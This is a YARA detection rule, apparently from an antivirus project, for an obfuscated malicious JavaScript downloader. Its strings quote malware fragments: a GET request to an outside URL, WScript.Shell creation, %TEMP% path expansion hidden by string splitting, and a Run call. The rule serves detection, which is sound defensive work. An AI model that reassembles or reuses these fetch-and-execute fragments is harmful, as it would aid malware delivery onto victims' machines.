rule sig_20160427_83a8f12dbe94db07848608d27ea30504 {
  meta:
    description = "datamaliciousorder - file 20160427_83a8f12dbe94db07848608d27ea30504.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "02ad31f1b90bf75e34caddda33d9b7f51283f84c140fe44faf6380d5c52eda07"

  strings:
    $s1  = "XujmsBjwcs[EqivpFwlhm](\"G\" + \"ET\", \"http://pediatriayvacunas.com/q0wps\", false);" fullword ascii
    $s2  = "function ZzalyVvdnu() {return BytiiJkwkm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Ncgh3wg" ascii
    $s3  = "function ZzalyVvdnu() {return BytiiJkwkm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Ncgh3wg" ascii
    $s4  = "var BytiiJkwkm = function VuatdTyysq() {return GqpjdWlmar[IrojtFpydy](\"WScript\"+\".Shell\");}(), MizczHoykf = 11;" fullword ascii
    $s5  = "function HhxctBnokv(NxbmtKmfjo, KzgcoOzdar){SutqfJofke = SutqfJofke * 1; return NxbmtKmfjo - KzgcoOzdar;};" fullword ascii
    $s6  = "var GqpjdWlmar = this[\"WScript\"];" fullword ascii
    $s7  = "if (XujmsBjwcs[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function RxnugHsocn(){return GqrqxJvhso + \"\";};" fullword ascii
    $s9  = "function CifveRjait() {return ((EukhpRozyn == true) && (EukhpRozyn == TioulZdcwk)) ? 1 : SutqfJofke;};" fullword ascii
    $s10 = "var KdcqgRxcki = false;" fullword ascii
    $s11 = "return HhxctBnokv(VazvhGihvq, SgwriNxcil);" fullword ascii
    $s12 = "function BxbrbOduug(UrtcyMrowa) {var TnjmkWzllt = (1, 2, 3, 4, 5, UrtcyMrowa); return TnjmkWzllt;};" fullword ascii
    $s13 = "function EpvmkMibiv(){return IrojtFpydy;};" fullword ascii
    $s14 = "var EukhpRozyn = false;" fullword ascii
    $s15 = "function YdtybFeyfo()" fullword ascii
    $s16 = "KdcqgRxcki = true;" fullword ascii
    $s17 = "}while (CpkizWrmdo);" fullword ascii
    $s18 = "EukhpRozyn = true; " fullword ascii
    $s19 = "function XljftZilnm(UlhpcNgfpt){BytiiJkwkm[\"R\"+\"un\"](UlhpcNgfpt, SutqfJofke, SutqfJofke);};" fullword ascii
    $s20 = "function JldsnZpfwu(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}